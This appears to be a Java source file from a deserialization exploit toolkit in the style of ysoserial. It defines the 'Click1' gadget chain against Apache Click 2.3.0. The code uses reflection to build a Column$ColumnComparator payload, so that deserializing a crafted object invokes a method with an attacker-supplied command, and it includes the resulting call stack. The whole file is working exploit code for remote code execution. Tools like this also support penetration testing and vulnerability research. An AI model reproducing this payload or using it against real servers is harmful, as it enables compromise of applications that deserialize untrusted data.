package org.ses.gadgetbuilder.chains1;

import org.apache.click.control.Column;
import org.apache.click.control.Table;

import org.ses.gadgetbuilder.adapters.GetterMethodInvokeAdapter;
import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.MethodInvokeGadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.math.BigInteger;
import java.util.Comparator;

@Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
@Authors({ Authors.ARTSPLOIT })
@Impact(Impact.MethodInvoke)
public class Click1 extends MethodInvokeGadgetChain<CompareTrampoline, GetterMethodInvokeAdapter> {

    public Click1(CompareTrampoline _trampoline, GetterMethodInvokeAdapter _adapter) {
        super(_trampoline, _adapter);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        final Column column = new Column(methodInvokeAdapter.getGetterMethodProperty());
        column.setTable(new Table());
        Comparator comparator = (Comparator) Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", column);

        return new TrampolineConnector(comparator, methodInvokeAdapter.getInvocationTarget(command), methodInvokeAdapter.getInvocationTarget(command));
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "org.apache.click.control.Column$ColumnComparator.compare()\n" +
                "org.apache.click.control.Column.getProperty()\n" +
                "org.apache.click.control.Column.getProperty()\n" +
                "org.apache.click.util.PropertyUtils.getValue()\n" +
                "org.apache.click.util.PropertyUtils.getObjectPropertyValue()\n" +
                "java.lang.reflect.Method.invoke()";
    }
}
